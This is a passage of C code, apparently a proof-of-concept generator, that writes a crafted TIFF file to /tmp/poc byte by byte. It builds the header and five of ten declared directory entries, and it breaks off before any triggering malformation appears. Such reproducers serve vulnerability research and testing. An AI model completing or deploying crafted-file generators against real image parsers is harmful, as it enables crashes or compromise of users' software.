int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* TIFF header: little-endian, magic 42, offset to first IFD = 8 */
    fputc(0x49, f); fputc(0x49, f); fputc(0x2A, f); fputc(0x00, f);
    fputc(0x08, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);

    /* IFD: 10 entries + next IFD offset = 0 */
    fputc(0x0A, f); fputc(0x00, f);

    /* Entry 1: Tag 256 (ImageWidth), LONG, count 1, value = 1 */
    fputc(0x00, f); fputc(0x01, f); fputc(0x04, f); fputc(0x00, f);
    fputc(0x01, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x01, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);

    /* Entry 2: Tag 257 (ImageLength), LONG, count 1, value = 1 */
    fputc(0x01, f); fputc(0x01, f); fputc(0x04, f); fputc(0x00, f);
    fputc(0x01, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x01, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);

    /* Entry 3: Tag 258 (BitsPerSample), SHORT, count 4, value offset = 134 */
    fputc(0x02, f); fputc(0x01, f); fputc(0x03, f); fputc(0x00, f);
    fputc(0x04, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x86, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);

    /* Entry 4: Tag 259 (Compression), SHORT, count 1, value = 1 */
    fputc(0x03, f); fputc(0x01, f); fputc(0x03, f); fputc(0x00, f);
    fputc(0x01, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x01, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);

    /* Entry 5: Tag 262 (PhotometricInterpretation), SHORT, count 1, value = 2 */
    fputc(0x06, f); fputc(0x01, f); fputc(0x03, f); fputc(0x00, f);
    fputc(0x01, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x02, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);

